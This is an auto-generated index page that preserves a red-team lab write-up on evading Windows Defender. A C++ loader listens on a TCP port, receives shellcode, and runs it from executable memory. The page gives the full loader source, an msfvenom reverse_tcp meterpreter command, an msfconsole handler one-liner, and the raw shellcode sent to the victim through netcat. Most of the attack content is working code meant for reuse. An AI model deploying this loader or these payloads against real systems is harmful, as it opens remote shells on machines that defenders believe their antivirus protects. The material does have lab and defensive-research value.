---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Bypassing Windows Defender: One TCP Socket Away From Meterpreter and Beacon Sessions

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-defense-evasion-bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Bypassing Windows Defender: One TCP Socket Away From Meterpreter and Beacon Sessions](../../topics/offensive-security/bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-beacon-sessions.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-defense-evasion-bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon |
| name | Bypassing Windows Defender: One TCP Socket Away From Meterpreter and Beacon Sessions |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/defense-evasion/bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Peek 2019-05-07 21-34.gif
- Peek 2019-05-07 21-40.gif
- Screenshot from 2019-05-07 20-45-02.png
- Screenshot from 2019-05-07 20-49-59.png
- Screenshot from 2019-05-07 22-23-33.png
_body: "# Bypassing Windows Defender: One TCP Socket Away From Meterpreter and Beacon Sessions\n\n## Context\n\nIf you've\
  \ tried executing an out of the box meterpreter payload on the box with Windows Defender, you know it may get picked up\
  \ right away as can be seen in the below gif:\n\n![](<../../.gitbook/assets/Peek 2019-05-07 21-40.gif>)\n\nThis quick lab\
  \ shows how I was able to execute the off the shelf meterpreter payload against the latest Windows Defender (7th of May\
  \ at the time of writing) by delivering the shellcode over a TCP socket.\n\n{% hint style=\"info\" %}\n**Works with Cobalt\
  \ Strike Beacon**\\\nThe demo uses metasploit's meterpreter payload, but I have tested this technique with Cobalt Strike\
  \ beacon and it also bypasses the Windows Defender.\n{% endhint %}\n\n## Overview\n\nThe technique that allowed me to bypass\
  \ Windows Defender is simple:\n\n* Victim machine (10.0.0.7) opens up a listening TCP socket on on port 443 (or any other)\n\
  * Socket on the victim machine waits for incoming shellcode\n* Attacking machine (10.0.0.5) connects to the victim socket\
  \ and sends the shellcode as binary data\n* Victim machine receives the shellcode, allocates executable memory and moves\
  \ the shellcode there\n* Victim machine executes the shellcode received over the network and initiates meterpreter (or cobalt\
  \ strike beacon) second stage download\n* Attacking machine serves the stage and catches the shell\n\n## Execution\n\nLet's\
  \ write, compile a simple PoC C++ program (see [Code](bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon.md#code)\
  \ section) that will do all of the steps explained in the overview section.\n\nLet's execute it on the victim machine and\
  \ check if the socket on port 443 has been opened:\n\n{% code title=\"attacker@victim\" %}\n```csharp\nnetstat -nat | findstr\
  \ /i listen | findstr /i 443\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from 2019-05-07 20-45-02.png>)\n\
  \nLet's generate a staged meterpreter payload and output it to C format:\n\n{% code title=\"attacker@kali\" %}\n```csharp\n\
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c > meterpreter.c\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-05-07 20-49-59.png>)\n\nLet's setup an msf handler to catch the meterpreter session on the attacking machine:\n\
  \n{% code title=\"attacker@kali\" %}\n```csharp\nmsfconsole -x \"use exploits/multi/handler; set lhost 10.0.0.5; set lport\
  \ 443; set payload windows/meterpreter/reverse_tcp; exploit\"\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-05-07 22-23-33.png>)\n\nWe can now take the shellcode from the C file and echo it out as a binary data, pipe\
  \ it to the victim machine (where a TCP socket is listening on 443) via netcat:\n\n{% code title=\"attacker@kali\" %}\n\
  ```bash\necho -e \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\\
  x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\\
  x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\\
  x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\\xf8\\\
  x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\\
  xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\\
  x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\x89\\xe8\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\\
  x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x68\\x0a\\x00\\x00\\x05\\x68\\x02\\x00\\x01\\xbb\\x89\\xe6\\x50\\\
  x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\\\
  xff\\xd5\\x85\\xc0\\x74\\x0a\\xff\\x4e\\x08\\x75\\xec\\xe8\\x67\\x00\\x00\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\\
  xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\\
  xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\\
  x58\\x68\\x00\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\\
  x5e\\x5e\\xff\\x0c\\x24\\x0f\\x85\\x70\\xff\\xff\\xff\\xe9\\x9b\\xff\\xff\\xff\\x01\\xc3\\x29\\xc6\\x75\\xc1\\xc3\\xbb\\\
  xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5\" | nc 10.0.0.7 443\n```\n{% endcode %}\n\nWe are now ready to execute the attack.\
  \ Below shows all of the above in action:\n\n1. Cmd shell in the middle of the screen opens the TCP socket (port 443) on\
  \ the victim machine\n2. Windows Defender below the cmd shell shows the signatures are up to date\n3. Top right - msfconsole\
  \ is waiting and ready to send the second stage from the attacking system\n4. Bottom right - attacker sends the shellcode\
  \ to the victim over the wire via netcat\n5. Top right - msfconsole serves the second stage to the victim and establishes\
  \ the meterpreter session\n\n![](<../../.gitbook/assets/Peek 2019-05-07 21-34.gif>)\n\n## Conclusion\n\nWhy this works?\
  \ I can only speculate. I am a huge fan of Windows Defender and I think it is doing an amazing job at catching evil and\
  \ I am sure this will be caught very soon.\n\n## Code\n\n```cpp\n#include \"pch.h\"\n#include <WinSock2.h>\n#include <WS2tcpip.h>\n\
  #include <iostream>\n#include <Windows.h>\n#pragma comment(lib, \"ws2_32.lib\")\n\nint main()\n{\n\tLPWSADATA wsaData =\
  \ new WSAData();\n\tADDRINFOA *socketHint = new ADDRINFOA();\n\tADDRINFOA *addressInfo = new ADDRINFOA();\n\tSOCKET listenSocket\
  \ = INVALID_SOCKET;\n\tSOCKET clientSocket = INVALID_SOCKET;\n\tCHAR bufferReceivedBytes[4096] = {0};\n\tINT receivedBytes\
  \ = 0;\n\tPCSTR port = \"443\";\n\n\tsocketHint->ai_family = AF_INET;\n\tsocketHint->ai_socktype = SOCK_STREAM;\n\tsocketHint->ai_protocol\
  \ = IPPROTO_TCP;\n\tsocketHint->ai_flags = AI_PASSIVE;\n\n\tWSAStartup(MAKEWORD(2, 2), wsaData);\n\tGetAddrInfoA(NULL, port,\
  \ socketHint, &addressInfo);\n\n\tlistenSocket = socket(addressInfo->ai_family, addressInfo->ai_socktype, addressInfo->ai_protocol);\n\
  \tbind(listenSocket, addressInfo->ai_addr, addressInfo->ai_addrlen);\n\tlisten(listenSocket, SOMAXCONN);\n\tstd::cout <<\
  \ \"Listening on TCP port \" << port << std::endl;\n\n\tclientSocket = accept(listenSocket, NULL, NULL);\n\tstd::cout <<\
  \ \"Incoming connection...\" << std::endl;\n\t\n\treceivedBytes = recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes),\
  \ NULL);\n\tif (receivedBytes > 0) {\n\t\tstd::cout << \"Received shellcode bytes \" << receivedBytes << std::endl;\n\t\
  }\n\t\n\tLPVOID shellcode = VirtualAlloc(NULL, receivedBytes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\tstd::cout\
  \ << \"Allocated memory for shellocode at: \" << shellcode << std::endl;\n\t\n\tmemcpy(shellcode, bufferReceivedBytes, sizeof(bufferReceivedBytes));\n\
  \tstd::cout << \"Copied shellcode to: \" << shellcode << std::endl << \"Sending back meterpreter session...\";\n\t((void(*)())\
  \ shellcode)();\n\t\n\treturn 0;\n}\n```\n\n## References\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/desktop/api/ws2tcpip/nf-ws2tcpip-getaddrinfo\"\
  \ %}"
_relative_path: offensive-security/defense-evasion/bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon.md
````
